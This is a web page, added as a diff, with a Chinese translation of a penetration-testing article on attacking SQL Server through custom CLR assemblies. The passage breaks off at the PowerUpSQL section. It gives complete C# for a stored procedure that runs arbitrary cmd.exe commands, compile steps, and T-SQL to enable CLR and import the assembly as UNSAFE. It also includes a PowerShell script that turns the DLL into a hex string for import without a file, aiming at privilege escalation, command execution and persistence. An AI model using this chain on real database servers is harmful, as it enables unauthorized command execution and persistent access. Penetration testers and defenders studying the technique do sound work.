@@ -1,0 +1,677 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】攻击SQL Server CLR程序集 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="SQL Server,mssql注入"/>
+    
+        <meta name="description" content="在这个博客中，我会扩展Nathan Kirk博客CLR系列的CLR组件攻击。 我将介绍如何创建，导入，导出和修改SQL Server中的CLR程序集，以达到提升权限，执行系统命令和持久性等目的。我还将分享一些使用PowerUpSQL在Active Directory环境中更大规模执行(批量)CLR攻击的技巧。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】攻击SQL Server CLR程序集</h2>
+                <div class="article-msg">
+                    <span class="time">2017-08-03 15:13:54</span>
+                    
+                                        <span class="read">阅读：13215次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4197"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4197" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/"
+                             target="_blank">来源： netspi.com</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2874729223" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2874729223" style="color:#848e99;">兄弟要碟吗</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p8.qhimg.com/t01e9b9e83cc1ade34b.png" title="t01e9b9e83cc1ade34b.png" alt="http://p8.qhimg.com/t01e9b9e83cc1ade34b.png"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">译者：</span><a href="http://bobao.360.cn/member/contribute?uid=2874729223" target="_self" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><span style="color: rgb(0, 112, 192);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">兄弟要碟吗</span></strong></span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这个博客中，我会扩展Nathan Kirk博客CLR系列的CLR组件攻击。&nbsp;我将介绍如何创建，导入，导出和修改SQL Server中的CLR程序集，以达到提升权限，执行系统命令和持久性等目的。我还将分享一些使用PowerUpSQL在Active Directory环境中更大规模执行(批量)CLR攻击的技巧。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">什么是SQL Server中的自定义CLR程序集？</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了这个博客可以更好的说明，我们将定义一个公共语言运行库（CLR）组件作为一个.NET的DLL（或一组DLL）可以导入到SQL服务器。一旦导入，DLL方法就可以链接到存储过程，并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本地功能的一个很好的方式，但自然也为攻击者创造了机会。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如何为SQL Server定制一个自定义的CLR DLL?</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下面是根据Nathan Kirk的操作和一些文章实现的利用微软C#执行系统命令的示例。你可以根据需要对代码作出修改，当你修改完毕后将文件保存至“c:\temp\cmd_exec.cs”。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><pre class="brush:plain;toolbar:false">using&nbsp;System;
+using&nbsp;System.Data;
+using&nbsp;System.Data.SqlClient;
+using&nbsp;System.Data.SqlTypes;
+using&nbsp;Microsoft.SqlServer.Server;
+using&nbsp;System.IO;
+using&nbsp;System.Diagnostics;
+using&nbsp;System.Text;
+public&nbsp;partial&nbsp;class&nbsp;StoredProcedures
+{
+&nbsp;&nbsp;&nbsp;&nbsp;[Microsoft.SqlServer.Server.SqlProcedure]
+&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;void&nbsp;cmd_exec&nbsp;(SqlString&nbsp;execCommand)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;proc&nbsp;=&nbsp;new&nbsp;Process();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.StartInfo.FileName&nbsp;=&nbsp;@&quot;C:\Windows\System32\cmd.exe&quot;;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.StartInfo.Arguments&nbsp;=&nbsp;string.Format(@&quot;&nbsp;/C&nbsp;{0}&quot;,&nbsp;execCommand.Value);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.StartInfo.UseShellExecute&nbsp;=&nbsp;false;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.StartInfo.RedirectStandardOutput&nbsp;=&nbsp;true;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.Start();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Create&nbsp;the&nbsp;record&nbsp;and&nbsp;specify&nbsp;the&nbsp;metadata&nbsp;for&nbsp;the&nbsp;columns.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SqlDataRecord&nbsp;record&nbsp;=&nbsp;new&nbsp;SqlDataRecord(new&nbsp;SqlMetaData(&quot;output&quot;,&nbsp;SqlDbType.NVarChar,&nbsp;4000));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Mark&nbsp;the&nbsp;beginning&nbsp;of&nbsp;the&nbsp;result&nbsp;set.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SqlContext.Pipe.SendResultsStart(record);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Set&nbsp;values&nbsp;for&nbsp;each&nbsp;column&nbsp;in&nbsp;the&nbsp;row
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;record.SetString(0,&nbsp;proc.StandardOutput.ReadToEnd().ToString());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Send&nbsp;the&nbsp;row&nbsp;back&nbsp;to&nbsp;the&nbsp;client.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SqlContext.Pipe.SendResultsRow(record);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Mark&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;result&nbsp;set.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SqlContext.Pipe.SendResultsEnd();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.WaitForExit();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc.Close();
+&nbsp;&nbsp;&nbsp;&nbsp;}
+};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们使用csc.exe将“c:\temp\cmd_exec.cs”编译成dll。在默认情况下即使你没有安装Visual Studio,csc.exe编译器是附带.NET框架的，我们使用下面的PowerShell命令来找到它。</span></p><pre class="brush:plain;toolbar:false">Get-ChildItem&nbsp;-Recurse&nbsp;&quot;C:\Windows\Microsoft.NET\&quot;&nbsp;-Filter&nbsp;&quot;csc.exe&quot;&nbsp;|&nbsp;Sort-Object&nbsp;fullname&nbsp;-Descending&nbsp;|&nbsp;Select-Object&nbsp;fullname&nbsp;-First&nbsp;1&nbsp;-ExpandProperty&nbsp;fullname</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你找到了csc.exe，你可以使用下面的命令将“c:\temp\cmd_exec.cs”编译成dll文件。</span></p><pre class="brush:plain;toolbar:false">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&nbsp;/target:library&nbsp;c:\temp\cmd_exec.cs</pre><p style="text-indent: 2em; text-align: left;"><strong style="font-size: 18px; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong style="font-size: 18px; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如何导入我的CLR DLL到SQL Server？</span></strong><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">要将dll导入SqlServer，需要SQL登录的权限为sysadmin，有CREATE ASSEMBLY权限或ALTER ASSEMBLY权限。然后按照以下步骤注册dll并且将其链接到存储过程，以便使用TSQL执行cmd_exec方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以sysadmin身份登录到SqlServer，并用下面TSQL查询：</span></p><pre class="brush:plain;toolbar:false">--&nbsp;Select&nbsp;the&nbsp;msdb&nbsp;database
+use&nbsp;msdb
+--&nbsp;Enable&nbsp;show&nbsp;advanced&nbsp;options&nbsp;on&nbsp;the&nbsp;server
+sp_configure&nbsp;&#39;show&nbsp;advanced&nbsp;options&#39;,1
+RECONFIGURE
+GO
+--&nbsp;Enable&nbsp;clr&nbsp;on&nbsp;the&nbsp;server
+sp_configure&nbsp;&#39;clr&nbsp;enabled&#39;,1
+RECONFIGURE
+GO
+--&nbsp;Import&nbsp;the&nbsp;assembly
+CREATE&nbsp;ASSEMBLY&nbsp;my_assembly
+FROM&nbsp;&#39;c:\temp\cmd_exec.dll&#39;
+WITH&nbsp;PERMISSION_SET&nbsp;=&nbsp;UNSAFE;
+--&nbsp;Link&nbsp;the&nbsp;assembly&nbsp;to&nbsp;a&nbsp;stored&nbsp;procedure
+CREATE&nbsp;PROCEDURE&nbsp;[dbo].[cmd_exec]&nbsp;@execCommand&nbsp;NVARCHAR&nbsp;(4000)&nbsp;AS&nbsp;EXTERNAL&nbsp;NAME&nbsp;[my_assembly].[StoredProcedures].[cmd_exec];
+GO</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，你应该可以通过“msdb”数据库中的“cmd_exec”存储过程执行系统命令了，如下面的示例所示。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0184210bba3ef7d11b.png" title="t01c8f9a0abda2ca203.png" alt="http://p0.qhimg.com/t01c8f9a0abda2ca203.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">完成后你可以使用下面的sql语句删掉该过程和程序集</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如何将我的CLR DLL转换成一个十六进制字符串并在没有文件的情况下导入它?</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CLR程序集导入SQLServer时不必一定要引用一个dll文件，“CREATE ASSEMBLY”也接受一个十六进制的字符串表示CLR DLL文件。下面是一个PowerShell脚本示例，演示了如何将你的“cmd_exec.dll”文件转换到sql命令中，它可以用来创建没有物理文件引用的程序集。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;Target&nbsp;file
+$assemblyFile&nbsp;=&nbsp;&quot;c:\temp\cmd_exec.dll&quot;
+#&nbsp;Build&nbsp;top&nbsp;of&nbsp;TSQL&nbsp;CREATE&nbsp;ASSEMBLY&nbsp;statement
+$stringBuilder&nbsp;=&nbsp;New-Object&nbsp;-Type&nbsp;System.Text.StringBuilder&nbsp;
+$stringBuilder.Append(&quot;CREATE&nbsp;ASSEMBLY&nbsp;[my_assembly]&nbsp;AUTHORIZATION&nbsp;[dbo]&nbsp;FROM&nbsp;`n0x&quot;)&nbsp;|&nbsp;Out-Null
+#&nbsp;Read&nbsp;bytes&nbsp;from&nbsp;file
+$fileStream&nbsp;=&nbsp;[IO.File]::OpenRead($assemblyFile)
+while&nbsp;(($byte&nbsp;=&nbsp;$fileStream.ReadByte())&nbsp;-gt&nbsp;-1)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;$stringBuilder.Append($byte.ToString(&quot;X2&quot;))&nbsp;|&nbsp;Out-Null
+}
+#&nbsp;Build&nbsp;bottom&nbsp;of&nbsp;TSQL&nbsp;CREATE&nbsp;ASSEMBLY&nbsp;statement
+$stringBuilder.AppendLine(&quot;`nWITH&nbsp;PERMISSION_SET&nbsp;=&nbsp;UNSAFE&quot;)&nbsp;|&nbsp;Out-Null
+$stringBuilder.AppendLine(&quot;GO&quot;)&nbsp;|&nbsp;Out-Null
+$stringBuilder.AppendLine(&quot;&nbsp;&quot;)&nbsp;|&nbsp;Out-Null
+#&nbsp;Build&nbsp;create&nbsp;procedure&nbsp;command
+$stringBuilder.AppendLine(&quot;CREATE&nbsp;PROCEDURE&nbsp;[dbo].[cmd_exec]&nbsp;@execCommand&nbsp;NVARCHAR&nbsp;(4000)&nbsp;AS&nbsp;EXTERNAL&nbsp;NAME&nbsp;[my_assembly].[StoredProcedures].[cmd_exec];&quot;)&nbsp;|&nbsp;Out-Null
+$stringBuilder.AppendLine(&quot;GO&quot;)&nbsp;|&nbsp;Out-Null
+$stringBuilder.AppendLine(&quot;&nbsp;&quot;)&nbsp;|&nbsp;Out-Null
+#&nbsp;Create&nbsp;run&nbsp;os&nbsp;command
+$stringBuilder.AppendLine(&quot;EXEC[dbo].[cmd_exec]&nbsp;&#39;whoami&#39;&quot;)&nbsp;|&nbsp;Out-Null
+$stringBuilder.AppendLine(&quot;GO&quot;)&nbsp;|&nbsp;Out-Null
+$stringBuilder.AppendLine(&quot;&nbsp;&quot;)&nbsp;|&nbsp;Out-Null
+#&nbsp;Create&nbsp;file&nbsp;containing&nbsp;all&nbsp;commands
+$stringBuilder.ToString()&nbsp;-join&nbsp;&quot;&quot;&nbsp;|&nbsp;Out-File&nbsp;c:\temp\cmd_exec.txt</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果一切顺利“c:\temp\cmd_exec.txt”文件应该包含以下SQL语句。在该示例中，十六进制字符串已被截断，但是你的长度应该更长。</span></p><pre class="brush:plain;toolbar:false">--&nbsp;Select&nbsp;the&nbsp;MSDB&nbsp;database
+USE&nbsp;msdb
+--&nbsp;Enable&nbsp;clr&nbsp;on&nbsp;the&nbsp;server
+Sp_Configure&nbsp;&#39;clr&nbsp;enabled&#39;,&nbsp;1
+RECONFIGURE
+GO
+--&nbsp;Create&nbsp;assembly&nbsp;from&nbsp;ascii&nbsp;hex
+CREATE&nbsp;ASSEMBLY&nbsp;[my_assembly]&nbsp;AUTHORIZATION&nbsp;[dbo]&nbsp;FROM&nbsp;
+0x4D5A90000300000004000000F[TRUNCATED]
+WITH&nbsp;PERMISSION_SET&nbsp;=&nbsp;UNSAFE&nbsp;
+GO&nbsp;
+--&nbsp;Create&nbsp;procedures&nbsp;from&nbsp;the&nbsp;assembly&nbsp;method&nbsp;cmd_exec
+CREATE&nbsp;PROCEDURE&nbsp;[dbo].[my_assembly]&nbsp;@execCommand&nbsp;NVARCHAR&nbsp;(4000)&nbsp;AS&nbsp;EXTERNAL&nbsp;NAME&nbsp;[cmd_exec].[StoredProcedures].[cmd_exec];&nbsp;
+GO&nbsp;
+--&nbsp;Run&nbsp;an&nbsp;OS&nbsp;command&nbsp;as&nbsp;the&nbsp;SQL&nbsp;Server&nbsp;service&nbsp;account
+EXEC[dbo].[cmd_exec]&nbsp;&#39;whoami&#39;&nbsp;
+GO</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当你用sysadmin权限在SqlServer中运行“c:\temp\cmd_exec.txt”的sql语句时，输出应该如下所示：</span></p><p style="text-align: center;"><img src="http://p4.qhimg.com/t01ab184575dd4d9a05.png" title="t014591620f675bd37a.png" alt="http://p9.qhimg.com/t014591620f675bd37a.png"/></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PowerUpSQL自动化</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可以在使用PowerUpSQL之前，访问此</span><a href="https://github.com/NetSPI/PowerUpSQL/wiki" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">链接</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">了解PowerUpSQL</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我做了一个PowerUpSQL函数来调用“Create-SQLFileCLRDll”创建类似的DLL和TSQL脚本。 它还支持设置自定义的程序集名称，类名称，方法名称和存储过程名称。 如果没有指定设置，那么它们都是随机的。 以下是一个基本的命令示例：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;C:\temp&gt;&nbsp;Create-SQLFileCLRDll&nbsp;-ProcedureName&nbsp;&quot;runcmd&quot;&nbsp;-OutFile&nbsp;runcmd&nbsp;-OutDir&nbsp;c:\temp
+C#&nbsp;File:&nbsp;c:\temp\runcmd.csc
